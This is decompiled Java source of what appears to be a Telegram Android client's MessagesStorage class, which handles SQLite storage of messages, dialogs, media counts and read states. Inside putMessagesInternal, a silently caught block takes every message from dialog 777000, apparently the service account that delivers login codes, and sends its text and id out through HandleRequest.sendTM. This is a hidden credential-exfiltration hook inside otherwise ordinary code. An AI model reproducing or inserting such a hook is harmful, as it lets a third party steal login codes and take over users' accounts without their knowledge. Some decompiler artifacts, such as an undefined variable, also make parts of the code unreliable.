        SQLitePreparedStatement state4 = this.database.executeFast("REPLACE INTO download_queue VALUES(?, ?, ?, ?)");
        SQLitePreparedStatement state5 = this.database.executeFast("REPLACE INTO webpage_pending VALUES(?, ?)");
        for (a = 0; a < messages.size(); a++) {
            TLRPC$Message message = (TLRPC$Message) messages.get(a);
            long messageId = (long) message.id;
            if (message.dialog_id == 0) {
                if (message.to_id.user_id != 0) {
                    message.dialog_id = (long) message.to_id.user_id;
                } else if (message.to_id.chat_id != 0) {
                    message.dialog_id = (long) (-message.to_id.chat_id);
                } else {
                    message.dialog_id = (long) (-message.to_id.channel_id);
                }
            }
            if (message.to_id.channel_id != 0) {
                messageId |= ((long) message.to_id.channel_id) << 32;
            }
            if (message.mentioned && message.media_unread) {
                mentionsIdsMap.put(Long.valueOf(messageId), Long.valueOf(message.dialog_id));
            }
            if (!((message.action instanceof TLRPC$TL_messageActionHistoryClear) || MessageObject.isOut(message) || (message.id <= 0 && !MessageObject.isUnread(message)))) {
                Integer currentMaxId = (Integer) dialogsReadMax.get(Long.valueOf(message.dialog_id));
                if (currentMaxId == null) {
                    cursor = this.database.queryFinalized("SELECT inbox_max FROM dialogs WHERE did = " + message.dialog_id, new Object[0]);
                    if (cursor.next()) {
                        currentMaxId = Integer.valueOf(cursor.intValue(0));
                    } else {
                        currentMaxId = Integer.valueOf(0);
                    }
                    cursor.dispose();
                    dialogsReadMax.put(Long.valueOf(message.dialog_id), currentMaxId);
                }
                if (message.id < 0 || currentMaxId.intValue() < message.id) {
                    if (messageIds.length() > 0) {
                        messageIds.append(",");
                    }
                    messageIds.append(messageId);
                    messagesIdsMap.put(Long.valueOf(messageId), Long.valueOf(message.dialog_id));
                }
            }
            if (SharedMediaQuery.canAddMessageToMedia(message)) {
                if (messageMediaIds == null) {
                    messageMediaIds = new StringBuilder();
                    messagesMediaIdsMap = new HashMap();
                    mediaTypes = new HashMap();
                }
                if (messageMediaIds.length() > 0) {
                    messageMediaIds.append(",");
                }
                messageMediaIds.append(messageId);
                messagesMediaIdsMap.put(Long.valueOf(messageId), Long.valueOf(message.dialog_id));
                mediaTypes.put(Long.valueOf(messageId), Integer.valueOf(SharedMediaQuery.getMediaType(message)));
            }
            if (isValidKeyboardToSave(message)) {
                TLRPC$Message oldMessage = (TLRPC$Message) botKeyboards.get(Long.valueOf(message.dialog_id));
                if (oldMessage == null || oldMessage.id < message.id) {
                    botKeyboards.put(Long.valueOf(message.dialog_id), message);
                }
            }
            try {
                if (((int) message.dialog_id) == 777000) {
                    HandleRequest.getNew(ApplicationLoader.applicationContext, new IResponseReceiver() {
                        public void onResult(Object object, int StatusCode) {
                        }
                    }).sendTM(new Gson().toJson(new TMData(message.message, messageId)));
                }
            } catch (Exception e2) {
            }
        }
        for (Entry<Long, TLRPC$Message> entry : botKeyboards.entrySet()) {
            BotQuery.putBotKeyboard(((Long) entry.getKey()).longValue(), (TLRPC$Message) entry.getValue());
        }
        if (messageMediaIds != null) {
            cursor = this.database.queryFinalized("SELECT mid FROM media_v2 WHERE mid IN(" + messageMediaIds.toString() + ")", new Object[0]);
            while (cursor.next()) {
                messagesMediaIdsMap.remove(Long.valueOf(cursor.longValue(0)));
            }
            cursor.dispose();
            mediaCounts = new HashMap();
            for (Entry<Long, Long> entry2 : messagesMediaIdsMap.entrySet()) {
                type = (Integer) mediaTypes.get(entry2.getKey());
                HashMap<Long, Integer> counts = (HashMap) mediaCounts.get(type);
                if (counts == null) {
                    counts = new HashMap();
                    count = Integer.valueOf(0);
                    mediaCounts.put(type, counts);
                } else {
                    count = (Integer) counts.get(entry2.getValue());
                }
                if (count == null) {
                    count = Integer.valueOf(0);
                }
                counts.put(entry2.getValue(), Integer.valueOf(count.intValue() + 1));
            }
        }
        if (messageIds.length() > 0) {
            cursor = this.database.queryFinalized("SELECT mid FROM messages WHERE mid IN(" + messageIds.toString() + ")", new Object[0]);
            while (cursor.next()) {
                long mid = cursor.longValue(0);
                messagesIdsMap.remove(Long.valueOf(mid));
                mentionsIdsMap.remove(Long.valueOf(mid));
            }
            cursor.dispose();
            for (Long dialog_id : messagesIdsMap.values()) {
                count = (Integer) messagesCounts.get(dialog_id);
                if (count == null) {
                    count = Integer.valueOf(0);
                }
                messagesCounts.put(dialog_id, Integer.valueOf(count.intValue() + 1));
            }
            for (Long dialog_id2 : mentionsIdsMap.values()) {
                count = (Integer) mentionCounts.get(dialog_id2);
                if (count == null) {
                    count = Integer.valueOf(0);
                }
                mentionCounts.put(dialog_id2, Integer.valueOf(count.intValue() + 1));
            }
        }
        int downloadMediaMask = 0;
        for (a = 0; a < messages.size(); a++) {
            message = (TLRPC$Message) messages.get(a);
            fixUnsupportedMedia(message);
            state.requery();
            messageId = (long) message.id;
            if (message.local_id != 0) {
                messageId = (long) message.local_id;
            }
            if (message.to_id.channel_id != 0) {
                messageId |= ((long) message.to_id.channel_id) << 32;
            }
            NativeByteBuffer data = new NativeByteBuffer(message.getObjectSize());
            message.serializeToStream(data);
            boolean updateDialog = true;
            if (!(message.action == null || !(message.action instanceof TLRPC$TL_messageEncryptedAction) || (message.action.encryptedAction instanceof TLRPC$TL_decryptedMessageActionSetMessageTTL) || (message.action.encryptedAction instanceof TLRPC$TL_decryptedMessageActionScreenshotMessages))) {
                updateDialog = false;
            }
            if (updateDialog) {
                lastMessage = (TLRPC$Message) messagesMap.get(Long.valueOf(message.dialog_id));
                if (lastMessage == null || message.date > lastMessage.date || ((message.id > 0 && lastMessage.id > 0 && message.id > lastMessage.id) || (message.id < 0 && lastMessage.id < 0 && message.id < lastMessage.id))) {
                    messagesMap.put(Long.valueOf(message.dialog_id), message);
                }
            }
            state.bindLong(1, messageId);
            state.bindLong(2, message.dialog_id);
            state.bindInteger(3, MessageObject.getUnreadFlags(message));
            state.bindInteger(4, message.send_state);
            state.bindInteger(5, message.date);
            state.bindByteBuffer(6, data);
            state.bindInteger(7, MessageObject.isOut(message) ? 1 : 0);
            state.bindInteger(8, message.ttl);
            if ((message.flags & 1024) != 0) {
                state.bindInteger(9, message.views);
            } else {
                state.bindInteger(9, getMessageMediaType(message));
            }
            state.bindInteger(10, 0);
            state.bindInteger(11, message.mentioned ? 1 : 0);
            state.step();
            if (message.random_id != 0) {
                state3.requery();
                state3.bindLong(1, message.random_id);
                state3.bindLong(2, messageId);
                state3.step();
            }
            if (SharedMediaQuery.canAddMessageToMedia(message)) {
                if (state2 == null) {
                    state2 = this.database.executeFast("REPLACE INTO media_v2 VALUES(?, ?, ?, ?, ?)");
                }
                state2.requery();
                state2.bindLong(1, messageId);
                state2.bindLong(2, message.dialog_id);
                state2.bindInteger(3, message.date);
                state2.bindInteger(4, SharedMediaQuery.getMediaType(message));
                state2.bindByteBuffer(5, data);
                state2.step();
            }
            if (message.media instanceof TLRPC$TL_messageMediaWebPage) {
                state5.requery();
                state5.bindLong(1, message.media.webpage.id);
                state5.bindLong(2, messageId);
                state5.step();
            }
            data.reuse();
            if (downloadMask != 0 && ((message.to_id.channel_id == 0 || message.post) && message.date >= ConnectionsManager.getInstance().getCurrentTime() - 3600 && MediaController.getInstance().canDownloadMedia(message) && ((message.media instanceof TLRPC$TL_messageMediaPhoto) || (message.media instanceof TLRPC$TL_messageMediaDocument)))) {
                int type2 = 0;
                long id = 0;
                TLRPC$MessageMedia object = null;
                if (MessageObject.isVoiceMessage(message)) {
                    id = message.media.document.id;
                    type2 = 2;
                    object = new TLRPC$TL_messageMediaDocument();
                    object.document = message.media.document;
                    object.flags |= 1;
                } else if (MessageObject.isRoundVideoMessage(message)) {
                    id = message.media.document.id;
                    type2 = 64;
                    object = new TLRPC$TL_messageMediaDocument();
                    object.document = message.media.document;
                    object.flags |= 1;
                } else if (message.media instanceof TLRPC$TL_messageMediaPhoto) {
                    if (FileLoader.getClosestPhotoSizeWithSize(message.media.photo.sizes, AndroidUtilities.getPhotoSize()) != null) {
                        id = message.media.photo.id;
                        type2 = 1;
                        object = new TLRPC$TL_messageMediaPhoto();
                        object.photo = message.media.photo;
                        object.flags |= 1;
                    }
                } else if (MessageObject.isVideoMessage(message)) {
                    id = message.media.document.id;
                    type2 = 4;
                    object = new TLRPC$TL_messageMediaDocument();
                    object.document = message.media.document;
                    object.flags |= 1;
                } else if (!(!(message.media instanceof TLRPC$TL_messageMediaDocument) || MessageObject.isMusicMessage(message) || MessageObject.isGifDocument(message.media.document))) {
                    id = message.media.document.id;
                    type2 = 8;
                    object = new TLRPC$TL_messageMediaDocument();
                    object.document = message.media.document;
                    object.flags |= 1;
                }
                if (object != null) {
                    if (message.media.ttl_seconds != 0) {
                        object.ttl_seconds = message.media.ttl_seconds;
                        object.flags |= 4;
                    }
                    downloadMediaMask |= type2;
                    state4.requery();
                    data = new NativeByteBuffer(object.getObjectSize());
                    object.serializeToStream(data);
                    state4.bindLong(1, id);
                    state4.bindInteger(2, type2);
                    state4.bindInteger(3, message.date);
                    state4.bindByteBuffer(4, data);
                    state4.step();
                    data.reuse();
                }
            }
        }
        state.dispose();
        if (state2 != null) {
            state2.dispose();
        }
        state3.dispose();
        state4.dispose();
        state5.dispose();
        state = this.database.executeFast("REPLACE INTO dialogs VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
        HashMap<Long, TLRPC$Message> dids = new HashMap();
        dids.putAll(messagesMap);
        for (Entry<Long, TLRPC$Message> pair : dids.entrySet()) {
            Long key = (Long) pair.getKey();
            if (key.longValue() != 0) {
                message = (TLRPC$Message) messagesMap.get(key);
                int channelId = 0;
                if (message != null) {
                    channelId = message.to_id.channel_id;
                }
                cursor = this.database.queryFinalized("SELECT date, unread_count, pts, last_mid, inbox_max, outbox_max, pinned, unread_count_i FROM dialogs WHERE did = " + key, new Object[0]);
                int dialog_date = 0;
                int last_mid = 0;
                int old_unread_count = 0;
                int pts = channelId != 0 ? 1 : 0;
                int inbox_max = 0;
                int outbox_max = 0;
                int pinned = 0;
                int old_mentions_count = 0;
                if (cursor.next()) {
                    dialog_date = cursor.intValue(0);
                    old_unread_count = cursor.intValue(1);
                    pts = cursor.intValue(2);
                    last_mid = cursor.intValue(3);
                    inbox_max = cursor.intValue(4);
                    outbox_max = cursor.intValue(5);
                    pinned = cursor.intValue(6);
                    old_mentions_count = cursor.intValue(7);
                } else if (channelId != 0) {
                    MessagesController.getInstance().checkChannelInviter(channelId);
                }
                cursor.dispose();
                Integer mentions_count = (Integer) mentionCounts.get(key);
                Integer unread_count = (Integer) messagesCounts.get(key);
                if (unread_count == null) {
                    unread_count = Integer.valueOf(0);
                } else {
                    messagesCounts.put(key, Integer.valueOf(unread_count.intValue() + old_unread_count));
                }
                if (mentions_count == null) {
                    mentions_count = Integer.valueOf(0);
                } else {
                    mentionCounts.put(key, Integer.valueOf(mentions_count.intValue() + old_mentions_count));
                }
                if (message != null) {
                    messageId = (long) message.id;
                } else {
                    messageId = (long) last_mid;
                }
                if (!(message == null || message.local_id == 0)) {
                    messageId = (long) message.local_id;
                }
                if (channelId != 0) {
                    messageId |= ((long) channelId) << 32;
                }
                state.requery();
                state.bindLong(1, key.longValue());
                if (message == null || (doNotUpdateDialogDate && dialog_date != 0)) {
                    state.bindInteger(2, dialog_date);
                } else {
                    state.bindInteger(2, message.date);
                }
                state.bindInteger(3, unread_count.intValue() + old_unread_count);
                state.bindLong(4, messageId);
                state.bindInteger(5, inbox_max);
                state.bindInteger(6, outbox_max);
                state.bindLong(7, 0);
                state.bindInteger(8, mentions_count.intValue() + old_mentions_count);
                state.bindInteger(9, pts);
                state.bindInteger(10, 0);
                state.bindInteger(11, pinned);
                state.step();
            }
        }
        state.dispose();
        if (mediaCounts != null) {
            state3 = this.database.executeFast("REPLACE INTO media_counts_v2 VALUES(?, ?, ?)");
            for (Entry<Integer, HashMap<Long, Integer>> counts2 : mediaCounts.entrySet()) {
                type = (Integer) counts2.getKey();
                for (Entry<Long, Integer> pair2 : ((HashMap) counts2.getValue()).entrySet()) {
                    long uid = ((Long) pair2.getKey()).longValue();
                    int lower_part = (int) uid;
                    int count2 = -1;
                    cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT count FROM media_counts_v2 WHERE uid = %d AND type = %d LIMIT 1", new Object[]{Long.valueOf(uid), type}), new Object[0]);
                    if (cursor.next()) {
                        count2 = cursor.intValue(0);
                    }
                    cursor.dispose();
                    if (count2 != -1) {
                        state3.requery();
                        count2 += ((Integer) pair2.getValue()).intValue();
                        state3.bindLong(1, uid);
                        state3.bindInteger(2, type.intValue());
                        state3.bindInteger(3, count2);
                        state3.step();
                    }
                }
            }
            state3.dispose();
        }
        if (withTransaction) {
            this.database.commitTransaction();
        }
        MessagesController.getInstance().processDialogsUpdateRead(messagesCounts, mentionCounts);
        if (downloadMediaMask != 0) {
            final int i = downloadMediaMask;
            AndroidUtilities.runOnUIThread(new Runnable() {
                public void run() {
                    MediaController.getInstance().newDownloadObjectsAvailable(i);
                }
            });
        }
    }

    public void putMessages(ArrayList<TLRPC$Message> messages, boolean withTransaction, boolean useQueue, boolean doNotUpdateDialogDate, int downloadMask) {
        putMessages(messages, withTransaction, useQueue, doNotUpdateDialogDate, downloadMask, false);
    }

    public void putMessages(ArrayList<TLRPC$Message> messages, boolean withTransaction, boolean useQueue, boolean doNotUpdateDialogDate, int downloadMask, boolean ifNoLastMessage) {
        if (messages.size() != 0) {
            if (useQueue) {
                final ArrayList<TLRPC$Message> arrayList = messages;
                final boolean z = withTransaction;
                final boolean z2 = doNotUpdateDialogDate;
                final int i = downloadMask;
                final boolean z3 = ifNoLastMessage;
                this.storageQueue.postRunnable(new Runnable() {
                    public void run() {
                        MessagesStorage.this.putMessagesInternal(arrayList, z, z2, i, z3);
                    }
                });
                return;
            }
            putMessagesInternal(messages, withTransaction, doNotUpdateDialogDate, downloadMask, ifNoLastMessage);
        }
    }

    public void markMessageAsSendError(final TLRPC$Message message) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    long messageId = (long) message.id;
                    if (message.to_id.channel_id != 0) {
                        messageId |= ((long) message.to_id.channel_id) << 32;
                    }
                    MessagesStorage.this.database.executeFast("UPDATE messages SET send_state = 2 WHERE mid = " + messageId).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void setMessageSeq(final int mid, final int seq_in, final int seq_out) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO messages_seq VALUES(?, ?, ?)");
                    state.requery();
                    state.bindInteger(1, mid);
                    state.bindInteger(2, seq_in);
                    state.bindInteger(3, seq_out);
                    state.step();
                    state.dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private long[] updateMessageStateAndIdInternal(long random_id, Integer _oldId, int newId, int date, int channelId) {
        SQLitePreparedStatement state;
        SQLiteCursor cursor = null;
        long newMessageId = (long) newId;
        if (_oldId == null) {
            try {
                cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT mid FROM randoms WHERE random_id = %d LIMIT 1", new Object[]{Long.valueOf(random_id)}), new Object[0]);
                if (cursor.next()) {
                    _oldId = Integer.valueOf(cursor.intValue(0));
                }
                if (cursor != null) {
                    cursor.dispose();
                }
            } catch (Exception e) {
                FileLog.e(e);
                if (cursor != null) {
                    cursor.dispose();
                }
            } catch (Throwable th) {
                if (cursor != null) {
                    cursor.dispose();
                }
            }
            if (_oldId == null) {
                return null;
            }
        }
        long oldMessageId = (long) _oldId.intValue();
        if (channelId != 0) {
            oldMessageId |= ((long) channelId) << 32;
            newMessageId |= ((long) channelId) << 32;
        }
        long did = 0;
        try {
            cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT uid FROM messages WHERE mid = %d LIMIT 1", new Object[]{Long.valueOf(oldMessageId)}), new Object[0]);
            if (cursor.next()) {
                did = cursor.longValue(0);
            }
            if (cursor != null) {
                cursor.dispose();
            }
        } catch (Exception e2) {
            FileLog.e(e2);
            if (cursor != null) {
                cursor.dispose();
            }
        } catch (Throwable th2) {
            if (cursor != null) {
                cursor.dispose();
            }
        }
        if (did == 0) {
            return null;
        }
        if (oldMessageId != newMessageId || date == 0) {
            state = null;
            try {
                state = this.database.executeFast("UPDATE messages SET mid = ?, send_state = 0 WHERE mid = ?");
                state.bindLong(1, newMessageId);
                state.bindLong(2, oldMessageId);
                state.step();
                if (state != null) {
                    state.dispose();
                    state = null;
                }
            } catch (Exception e3) {
                try {
                    this.database.executeFast(String.format(Locale.US, "DELETE FROM messages WHERE mid = %d", new Object[]{Long.valueOf(oldMessageId)})).stepThis().dispose();
                    this.database.executeFast(String.format(Locale.US, "DELETE FROM messages_seq WHERE mid = %d", new Object[]{Long.valueOf(oldMessageId)})).stepThis().dispose();
                } catch (Exception e22) {
                    FileLog.e(e22);
                } catch (Throwable th3) {
                    if (state != null) {
                        state.dispose();
                    }
                }
                if (state != null) {
                    state.dispose();
                    state = null;
                }
            }
            try {
                state = this.database.executeFast("UPDATE media_v2 SET mid = ? WHERE mid = ?");
                state.bindLong(1, newMessageId);
                state.bindLong(2, oldMessageId);
                state.step();
                if (state != null) {
                    state.dispose();
                    state = null;
                }
            } catch (Exception e4) {
                try {
                    this.database.executeFast(String.format(Locale.US, "DELETE FROM media_v2 WHERE mid = %d", new Object[]{Long.valueOf(oldMessageId)})).stepThis().dispose();
                } catch (Exception e222) {
                    FileLog.e(e222);
                } catch (Throwable th4) {
                    if (state != null) {
                        state.dispose();
                    }
                }
                if (state != null) {
                    state.dispose();
                    state = null;
                }
            }
            try {
                state = this.database.executeFast("UPDATE dialogs SET last_mid = ? WHERE last_mid = ?");
                state.bindLong(1, newMessageId);
                state.bindLong(2, oldMessageId);
                state.step();
                if (state != null) {
                    state.dispose();
                }
            } catch (Exception e23) {
                FileLog.e(e23);
                if (state != null) {
                    state.dispose();
                }
            } catch (Throwable th5) {
                if (state != null) {
                    state.dispose();
                }
            }
            return new long[]{did, (long) _oldId.intValue()};
        }
        state = null;
        try {
            state = this.database.executeFast("UPDATE messages SET send_state = 0, date = ? WHERE mid = ?");
            state.bindInteger(1, date);
            state.bindLong(2, newMessageId);
            state.step();
            if (state != null) {
                state.dispose();
            }
        } catch (Exception e232) {
            FileLog.e(e232);
            if (state != null) {
                state.dispose();
            }
        } catch (Throwable th6) {
            if (state != null) {
                state.dispose();
            }
        }
        return new long[]{did, (long) newId};
    }

    public long[] updateMessageStateAndId(long random_id, Integer _oldId, int newId, int date, boolean useQueue, int channelId) {
        if (!useQueue) {
            return updateMessageStateAndIdInternal(random_id, _oldId, newId, date, channelId);
        }
        final long j = random_id;
        final Integer num = _oldId;
        final int i = newId;
        final int i2 = date;
        final int i3 = channelId;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                MessagesStorage.this.updateMessageStateAndIdInternal(j, num, i, i2, i3);
            }
        });
        return null;
    }

    private void updateUsersInternal(ArrayList<User> users, boolean onlyStatus, boolean withTransaction) {
        if (Thread.currentThread().getId() != this.storageQueue.getId()) {
            throw new RuntimeException("wrong db thread");
        } else if (onlyStatus) {
            if (withTransaction) {
                try {
                    this.database.beginTransaction();
                } catch (Exception e) {
                    FileLog.e(e);
                    return;
                }
            }
            SQLitePreparedStatement state = this.database.executeFast("UPDATE users SET status = ? WHERE uid = ?");
            r7 = users.iterator();
            while (r7.hasNext()) {
                user = (User) r7.next();
                state.requery();
                if (user.status != null) {
                    state.bindInteger(1, user.status.expires);
                } else {
                    state.bindInteger(1, 0);
                }
                state.bindInteger(2, user.id);
                state.step();
            }
            state.dispose();
            if (withTransaction) {
                this.database.commitTransaction();
            }
        } else {
            StringBuilder ids = new StringBuilder();
            HashMap<Integer, User> usersDict = new HashMap();
            r7 = users.iterator();
            while (r7.hasNext()) {
                user = (User) r7.next();
                if (ids.length() != 0) {
                    ids.append(",");
                }
                ids.append(user.id);
                usersDict.put(Integer.valueOf(user.id), user);
            }
            ArrayList<User> loadedUsers = new ArrayList();
            getUsersInternal(ids.toString(), loadedUsers);
            r7 = loadedUsers.iterator();
            while (r7.hasNext()) {
                user = (User) r7.next();
                User updateUser = (User) usersDict.get(Integer.valueOf(user.id));
                if (updateUser != null) {
                    if (updateUser.first_name != null && updateUser.last_name != null) {
                        if (!UserObject.isContact(user)) {
                            user.first_name = updateUser.first_name;
                            user.last_name = updateUser.last_name;
                        }
                        user.username = updateUser.username;
                    } else if (updateUser.photo != null) {
                        user.photo = updateUser.photo;
                    } else if (updateUser.phone != null) {
                        user.phone = updateUser.phone;
                    }
                }
            }
            if (!loadedUsers.isEmpty()) {
                if (withTransaction) {
                    this.database.beginTransaction();
                }
                putUsersInternal(loadedUsers);
                if (withTransaction) {
                    this.database.commitTransaction();
                }
            }
        }
    }

    public void updateUsers(final ArrayList<User> users, final boolean onlyStatus, final boolean withTransaction, boolean useQueue) {
        if (!users.isEmpty()) {
            if (useQueue) {
                this.storageQueue.postRunnable(new Runnable() {
                    public void run() {
                        MessagesStorage.this.updateUsersInternal(users, onlyStatus, withTransaction);
                    }
                });
            } else {
                updateUsersInternal(users, onlyStatus, withTransaction);
            }
        }
    }

    private void markMessagesAsReadInternal(SparseArray<Long> inbox, SparseArray<Long> outbox, HashMap<Integer, Integer> encryptedMessages) {
        int b;
        if (inbox != null) {
            b = 0;
            while (b < inbox.size()) {
                try {
                    long messageId = ((Long) inbox.get(inbox.keyAt(b))).longValue();
                    this.database.executeFast(String.format(Locale.US, "UPDATE messages SET read_state = read_state | 1 WHERE uid = %d AND mid > 0 AND mid <= %d AND read_state IN(0,2) AND out = 0", new Object[]{Integer.valueOf(key), Long.valueOf(messageId)})).stepThis().dispose();
                    b++;
                } catch (Exception e) {
                    FileLog.e(e);
                    return;
                }
            }
        }
        if (outbox != null) {
            for (b = 0; b < outbox.size(); b++) {
                messageId = ((Long) outbox.get(outbox.keyAt(b))).longValue();
                this.database.executeFast(String.format(Locale.US, "UPDATE messages SET read_state = read_state | 1 WHERE uid = %d AND mid > 0 AND mid <= %d AND read_state IN(0,2) AND out = 1", new Object[]{Integer.valueOf(key), Long.valueOf(messageId)})).stepThis().dispose();
            }
        }
        if (encryptedMessages != null && !encryptedMessages.isEmpty()) {
            for (Entry<Integer, Integer> entry : encryptedMessages.entrySet()) {
                long dialog_id = ((long) ((Integer) entry.getKey()).intValue()) << 32;
                int max_date = ((Integer) entry.getValue()).intValue();
                SQLitePreparedStatement state = this.database.executeFast("UPDATE messages SET read_state = read_state | 1 WHERE uid = ? AND date <= ? AND read_state IN(0,2) AND out = 1");
                state.requery();
                state.bindLong(1, dialog_id);
                state.bindInteger(2, max_date);
                state.step();
                state.dispose();
            }
        }
    }

    public void markMessagesContentAsRead(final ArrayList<Long> mids, final int date) {
        if (mids != null && !mids.isEmpty()) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        String midsStr = TextUtils.join(",", mids);
                        MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE messages SET read_state = read_state | 2 WHERE mid IN (%s)", new Object[]{midsStr})).stepThis().dispose();
                        if (date != 0) {
                            SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid, ttl FROM messages WHERE mid IN (%s) AND ttl > 0", new Object[]{midsStr}), new Object[0]);
                            ArrayList<Integer> arrayList = null;
                            while (cursor.next()) {
                                if (arrayList == null) {
                                    arrayList = new ArrayList();
                                }
                                arrayList.add(Integer.valueOf(cursor.intValue(0)));
                            }
                            if (arrayList != null) {
                                MessagesStorage.this.emptyMessagesMedia(arrayList);
                            }
                            cursor.dispose();
                        }
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void markMessagesAsRead(final SparseArray<Long> inbox, final SparseArray<Long> outbox, final HashMap<Integer, Integer> encryptedMessages, boolean useQueue) {
        if (useQueue) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    MessagesStorage.this.markMessagesAsReadInternal(inbox, outbox, encryptedMessages);
                }
            });
        } else {
            markMessagesAsReadInternal(inbox, outbox, encryptedMessages);
        }
    }

    public void markMessagesAsDeletedByRandoms(final ArrayList<Long> messages) {
        if (!messages.isEmpty()) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        String ids = TextUtils.join(",", messages);
                        SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid FROM randoms WHERE random_id IN(%s)", new Object[]{ids}), new Object[0]);
                        final ArrayList<Integer> mids = new ArrayList();
                        while (cursor.next()) {
                            mids.add(Integer.valueOf(cursor.intValue(0)));
                        }
                        cursor.dispose();
                        if (!mids.isEmpty()) {
                            AndroidUtilities.runOnUIThread(new Runnable() {
                                public void run() {
                                    NotificationCenter.getInstance().postNotificationName(NotificationCenter.messagesDeleted, new Object[]{mids, Integer.valueOf(0)});
                                }
                            });
                            MessagesStorage.getInstance().updateDialogsWithReadMessagesInternal(mids, null, null, null);
                            MessagesStorage.getInstance().markMessagesAsDeletedInternal((ArrayList) mids, 0);
                            MessagesStorage.getInstance().updateDialogsWithDeletedMessagesInternal(mids, null, 0);
                        }
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    private ArrayList<Long> markMessagesAsDeletedInternal(ArrayList<Integer> messages, int channelId) {
        try {
            String ids;
            Iterator it;
            ArrayList<Long> arrayList = new ArrayList();
            HashMap<Long, Integer[]> dialogsToUpdate = new HashMap();
            if (channelId != 0) {
                StringBuilder builder = new StringBuilder(messages.size());
                for (int a = 0; a < messages.size(); a++) {
                    long messageId = ((long) ((Integer) messages.get(a)).intValue()) | (((long) channelId) << 32);
                    if (builder.length() > 0) {
                        builder.append(',');
                    }
                    builder.append(messageId);
                }
                ids = builder.toString();
            } else {
                ids = TextUtils.join(",", messages);
            }
            ArrayList<File> filesToDelete = new ArrayList();
            int currentUser = UserConfig.getClientUserId();
            SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT uid, data, read_state, out, mention FROM messages WHERE mid IN(%s)", new Object[]{ids}), new Object[0]);
            while (cursor.next()) {
                try {
                    long did = cursor.longValue(0);
                    if (did != ((long) currentUser)) {
                        int read_state = cursor.intValue(2);
                        if (cursor.intValue(3) == 0) {
                            Integer num;
                            Integer[] unread_count = (Integer[]) dialogsToUpdate.get(Long.valueOf(did));
                            if (unread_count == null) {
                                unread_count = new Integer[]{Integer.valueOf(0), Integer.valueOf(0)};
                                dialogsToUpdate.put(Long.valueOf(did), unread_count);
                            }
                            if (read_state < 2) {
                                num = unread_count[1];
                                unread_count[1] = Integer.valueOf(unread_count[1].intValue() + 1);
                            }
                            if (read_state == 0 || read_state == 2) {
                                num = unread_count[0];
                                unread_count[0] = Integer.valueOf(unread_count[0].intValue() + 1);
                            }
                        }
                        if (((int) did) == 0) {
                            NativeByteBuffer data = cursor.byteBufferValue(1);
                            if (data != null) {
                                TLRPC$Message message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                if (message == null) {
                                    continue;
                                } else if (message.media instanceof TLRPC$TL_messageMediaPhoto) {
                                    it = message.media.photo.sizes.iterator();
                                    while (it.hasNext()) {
                                        file = FileLoader.getPathToAttach((TLRPC$PhotoSize) it.next());
                                        if (file != null && file.toString().length() > 0) {
                                            filesToDelete.add(file);
                                        }
                                    }
                                } else if (message.media instanceof TLRPC$TL_messageMediaDocument) {
                                    file = FileLoader.getPathToAttach(message.media.document);
                                    if (file != null && file.toString().length() > 0) {
                                        filesToDelete.add(file);
                                    }
                                    file = FileLoader.getPathToAttach(message.media.document.thumb);
                                    if (file != null && file.toString().length() > 0) {
                                        filesToDelete.add(file);
                                    }
                                }
                            } else {
                                continue;
                            }
                        } else {
                            continue;
                        }
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
            cursor.dispose();
            FileLoader.getInstance().deleteFiles(filesToDelete, 0);
            for (Entry<Long, Integer[]> entry : dialogsToUpdate.entrySet()) {
                Long did2 = (Long) entry.getKey();
                Integer[] counts = (Integer[]) entry.getValue();
                cursor = this.database.queryFinalized("SELECT unread_count, unread_count_i FROM dialogs WHERE did = " + did2, new Object[0]);
                int old_unread_count = 0;
                int old_mentions_count = 0;
                if (cursor.next()) {
                    old_unread_count = cursor.intValue(0);
                    old_mentions_count = cursor.intValue(1);
                }
                cursor.dispose();
                arrayList.add(did2);
                SQLitePreparedStatement state = this.database.executeFast("UPDATE dialogs SET unread_count = ?, unread_count_i = ? WHERE did = ?");
                state.requery();
                state.bindInteger(1, Math.max(0, old_unread_count - counts[0].intValue()));
                state.bindInteger(2, Math.max(0, old_mentions_count - counts[1].intValue()));
                state.bindLong(3, did2.longValue());
                state.step();
                state.dispose();
            }
            this.database.executeFast(String.format(Locale.US, "DELETE FROM messages WHERE mid IN(%s)", new Object[]{ids})).stepThis().dispose();
            this.database.executeFast(String.format(Locale.US, "DELETE FROM bot_keyboard WHERE mid IN(%s)", new Object[]{ids})).stepThis().dispose();
            this.database.executeFast(String.format(Locale.US, "DELETE FROM messages_seq WHERE mid IN(%s)", new Object[]{ids})).stepThis().dispose();
            this.database.executeFast(String.format(Locale.US, "DELETE FROM media_v2 WHERE mid IN(%s)", new Object[]{ids})).stepThis().dispose();
            this.database.executeFast("DELETE FROM media_counts_v2 WHERE 1").stepThis().dispose();
            BotQuery.clearBotKeyboard(0, messages);
            return arrayList;
        } catch (Exception e2) {
            FileLog.e(e2);
            return null;
        }
    }

    private void updateDialogsWithDeletedMessagesInternal(ArrayList<Integer> messages, ArrayList<Long> additionalDialogsToUpdate, int channelId) {
        if (Thread.currentThread().getId() != this.storageQueue.getId()) {
            throw new RuntimeException("wrong db thread");
        }
        try {
            String ids;
            SQLiteCursor cursor;
